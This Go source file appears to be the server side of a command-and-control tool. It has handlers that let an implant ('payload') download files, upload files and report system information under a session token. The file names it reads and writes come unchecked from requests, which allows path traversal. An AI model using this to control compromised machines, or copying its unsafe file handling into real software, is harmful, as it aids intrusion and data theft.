// This file contains secondary handlers.
// Secondary handlers are all handlers that are not GetCmd and CmdOutput

package server

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
)

// FileUpload handles the /upload endpoint.
func FileUpload(w http.ResponseWriter, req *http.Request) {
	// retrieve the file from the request
	file, handler, err := req.FormFile("uploadFile")
	if err != nil {
		cli.Printf("[-] Error retrieving file: %s\n", err)
		return
	}

	// read the file data
	defer file.Close()
	bytes, err := ioutil.ReadAll(file)
	if err != nil {
		cli.Printf("[-] Error reading the uploaded file: %s\n", err)
	}

	// create uploads dir if not existant yet
	_ = os.Mkdir("uploads", 0755)
	// read data into local file
	err = ioutil.WriteFile("uploads/"+handler.Filename, bytes, 0755)
	if err != nil {
		cli.Printf("[-] Error creating and reading into local file: %s\n", err)
	}
	cli.Println("[+] Successfully uploaded file")
	w.Header().Set("Connection", "close")
	fmt.Fprintf(w, "Successfully uploaded file")
}

// FileDownload handles the /download endpoint.
func FileDownload(w http.ResponseWriter, req *http.Request) {
	// get the filename from the request
	filename := req.URL.Query().Get("file")
	if filename == "" {
		cli.Println("[-] Download request doesn't contain file name")
		http.Error(w, "no file indicatd to download", 400)
		return
	}
	cli.Println("[+] Payload wants to download ", filename)

	// open the file if it exists
	file, err := os.Open(filename)
	defer file.Close()
	if err != nil {
		cli.Printf("[-] Error trying to open file: %s\n", err)
		http.Error(w, "File not found", 404)
		return
	}

	// create header
	fileHeader := make([]byte, 512)
	file.Read(fileHeader)
	fileContentType := http.DetectContentType(fileHeader)
	stats, _ := file.Stat()
	fileSize := strconv.FormatInt(stats.Size(), 10)
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	w.Header().Set("Content-Type", fileContentType)
	w.Header().Set("Content-Length", fileSize)

	// reset descriptor offset since we already read 512 bytes
	file.Seek(0, 0)
	// write file into request
	_, err = io.Copy(w, file)
	if err != nil {
		cli.Printf("[-] Error writing file into response: %s\n", err)
		return
	}
	cli.Println("[+] Successfully downloaded file")
	w.Header().Set("Connection", "close")
	fmt.Fprintf(w, "Successfully downloaded file")
}

// GetSysinfo handles the /sysinfo endpoint.
func GetSysinfo(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		index := FindSessionIndexByToken(req.Header.Get("token"))
		if index == -1 {
			cli.Printf("[-] Error while getting session from token: %s\n", ErrUnrecognizedSessionToken)
			return
		}
		cli.Println("[+] Got system information from session: ", index)
		body, _ := ioutil.ReadAll(req.Body)
		defer req.Body.Close()

		sessionObj, _ := GetSession(index)

		err := json.Unmarshal(body, &sessionObj.SysInfo)
		if err != nil {
			cli.Printf("[-] Error while parsing the JSON system information: %s\n", err)
			return
		}

		w.Header().Set("Connection", "close")
		fmt.Fprintf(w, "Successfully got system information")
	}
}
